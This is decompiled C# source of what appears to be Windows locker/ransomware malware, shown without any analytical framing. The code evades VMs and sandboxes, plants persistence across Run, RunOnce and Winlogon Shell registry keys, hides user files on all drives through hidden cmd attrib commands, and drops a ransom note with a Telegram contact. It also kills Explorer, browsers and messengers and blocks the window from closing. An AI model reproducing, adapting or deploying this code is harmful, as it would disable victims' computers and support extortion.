using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace NET.Internal
{
	// Token: 0x0200000F RID: 15
	[DesignerGenerated]
	internal partial class Bridge : Form
	{
		// Token: 0x06000037 RID: 55 RVA: 0x00003CAC File Offset: 0x00001EAC
		public Bridge()
		{
			base.Load += this.EnableSingleton;
			base.FormClosing += this.InitSingleton;
			this.product = new string[]
			{
				"D",
				"H",
				"Z",
				"Q",
				"W",
				"L",
				"K",
				"J",
				"G",
				"S",
				"I",
				"T",
				"V",
				"W",
				"R",
				"X",
				"P",
				"E",
				"B",
				"M",
				"F"
			};
			this.@base = new string[]
			{
				"telegram",
				"discord",
				"skype",
				"zoom",
				"msedge",
				"chrome",
				"opera",
				"browser",
				"firefox",
				"javaw",
				"steam",
				"steamwebhelper",
				"steamservice",
				"EpicGamesLauncher"
			};
			this.m_Role = new string[]
			{
				"AWindowsService.exe",
				"taskhost.exe",
				"windowsx-c.exe",
				"System.exe",
				"_default64.exe",
				"native.exe",
				"ux-cryptor.exe",
				"crypt0rsx.exe"
			};
			this._Client = "attrib $h $s $r $i /D ";
			this.m_Parser = System.Environment.ExpandEnvironmentVariables("%temp%\\$unlocker_id.ux-cryptobytes");
			this.descriptor = false;
			this.CreateSingleton();
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00003F0C File Offset: 0x0000210C
		private void CreateSingleton()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Bridge));
			base.SuspendLayout();
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.White;
			base.ClientSize = new Size(120, 0);
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "loader";
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = FormStartPosition.Manual;
			this.Text = "System32";
			base.TransparencyKey = Color.White;
			base.WindowState = FormWindowState.Minimized;
			base.ResumeLayout(false);
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003FD4 File Offset: 0x000021D4
		private void EnableSingleton(object sender, System.EventArgs e)
		{
			object[] array = new object[]
			{
				new Algo(),
				new Callback(),
				new Proxy()
			};
			bool flag = true;
			if (Conversions.ToBoolean(true == System.Environment.MachineName.Contains("VPS") || flag == System.Environment.MachineName.Contains("VDS") || Conversions.ToBoolean(Operators.CompareObjectEqual(flag, NewLateBinding.LateGet(array[0], null, "VM_Detected", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(flag, NewLateBinding.LateGet(array[1], null, "AnyRun_Detected", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(flag, NewLateBinding.LateGet(array[2], null, "SandBox_Detected", new object[0], null, null, null), false))))
			{
				this.CollectSingleton();
			}
			checked
			{
				if (!Interaction.Command().Contains("debug"))
				{
					try
					{
						RegistryKey[] array2 = new RegistryKey[]
						{
							Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true),
							Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true),
							Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true),
							Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", true)
						};
						array2[0].SetValue("WindowsInstaller", "\"" + Application.ExecutablePath + "\" -startup");
						array2[0].SetValue("MSEdgeUpdateX", "\"" + Application.ExecutablePath + "\"");
						array2[1].SetValue("System3264Wow", "\"" + Application.ExecutablePath + "\" --init");
						array2[1].SetValue("OneDrive10293", "\"" + Application.ExecutablePath + "\" /setup");
						array2[1].SetValue("WINDOWS", "\"" + Application.ExecutablePath + "\" --wininit");
						array2[2].SetValue("Shell", "\"" + Application.ExecutablePath + "\"");
						array2[3].SetValue("a", "СОСИ ХУЙ ШЛЮХА!!\\1");
						array2[3].SetValue("b", "HAHAHAHAHAHAHA\\1");
						array2[3].SetValue("c", "winlocker.ru\\1");
						array2[3].SetValue("MRUList", "abc");
					}
					catch (System.Exception ex)
					{
					}
					string text = Advisor.SetSingleton.Info.OSFullName.Trim().ToLower();
					System.Threading.Thread thread = (new System.Threading.Thread[]
					{
						new System.Threading.Thread(delegate()
						{
							string str = "/S *";
							ref string ptr = ref this._Client;
							this._Client = ptr + str;
						})
					})[0];
					bool flag2 = true;
					if (true != text.Contains("10") && flag2 != text.Contains("11"))
					{
						thread.Start();
					}
					try
					{
						int num = 1;
						do
						{
							Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("WIN32_" + Conversions.ToString(num), this.m_Role[num - 1]);
							num++;
						}
						while (num <= 8);
						try
						{
							if (!File.Exists(this.m_Parser))
							{
								File.WriteAllText(this.m_Parser, DateAndTime.TimeString.Replace(":", null));
							}
						}
						catch (System.Exception ex2)
						{
							this.descriptor = true;
						}
						int num2 = 0;
						foreach (Screen screen in Screen.AllScreens)
						{
							num2++;
							if (num2 == 1)
							{
								Worker worker = new Worker();
								Rectangle workingArea = screen.WorkingArea;
								worker.Top = workingArea.Top;
								worker.Left = workingArea.Left;
								worker.Show();
								worker.Activate();
							}
							else
							{
								Prototype prototype = new Prototype();
								Rectangle workingArea2 = screen.WorkingArea;
								prototype.Top = workingArea2.Top;
								prototype.Left = workingArea2.Left;
								prototype.Show();
								prototype.Activate();
							}
						}
						this.PatchSingleton();
						this.ForgotSingleton();
						Process[] processes = Process.GetProcesses();
						int num3 = this.@base.Length - 1;
						for (int j = 0; j <= num3; j++)
						{
							try
							{
								foreach (Process process in processes)
								{
									if (process.ProcessName.ToLower().Contains(this.@base[j].ToLower()))
									{
										process.Kill();
									}
								}
							}
							catch (System.Exception ex3)
							{
							}
						}
						return;
					}
					catch (System.Exception ex4)
					{
						return;
					}
				}
				if (!File.Exists(this.m_Parser))
				{
					File.WriteAllText(this.m_Parser, "121212");
				}
				Advisor.MapSingleton._o_program.Show();
			}
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00004558 File Offset: 0x00002758
		public void PatchSingleton()
		{
			checked
			{
				try
				{
					string str = this._Client.Replace("$", "+") + " & echo [%RANDOM%] Ooops! Your files are encrypted by the UI-Load hacker group! Telegram for contact: @JumperYT 1>info-0v92.txt & attrib -h +s +r info-0v92.txt";
					string[] array = new string[]
					{
						"%userprofile%\\desktop",
						"%systemdrive%\\Users\\Public\\Desktop",
						"%userprofile%\\downloads",
						"%userprofile%\\documents",
						"%userprofile%"
					};
					int num = this.product.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						if (Directory.Exists(this.product[i] + ":\\"))
						{
							string str2 = this.product[i] + ":";
							Interaction.Shell("cmd.exe /c " + str2 + " & " + str, AppWinStyle.Hide, false, -1);
						}
					}
					int num2 = array.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						Interaction.Shell("cmd.exe /c cd \"" + array[j] + "\"&" + str, AppWinStyle.Hide, false, -1);
					}
				}
				catch (System.Exception ex)
				{
				}
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00004694 File Offset: 0x00002894
		public void ForgotSingleton()
		{
			try
			{
				Interaction.Shell("taskkill.exe /im Explorer.exe /f", AppWinStyle.Hide, false, -1);
			}
			catch (System.Exception ex)
			{
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00003C98 File Offset: 0x00001E98
		private void InitSingleton(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000046D4 File Offset: 0x000028D4
		private void CollectSingleton()
		{
			Interaction.MsgBox("0xC00000FD: The memory location at the specified address returned \"null\"", MsgBoxStyle.OkCancel | MsgBoxStyle.Critical, Application.ExecutablePath);
			ProjectData.EndApp();
		}

		// Token: 0x04000013 RID: 19
		public string[] product;

		// Token: 0x04000014 RID: 20
		public string[] @base;

		// Token: 0x04000015 RID: 21
		public string[] m_Role;

		// Token: 0x04000016 RID: 22
		public string _Client;

		// Token: 0x04000017 RID: 23
		public string m_Parser;

		// Token: 0x04000018 RID: 24
		public object descriptor;
	}
}
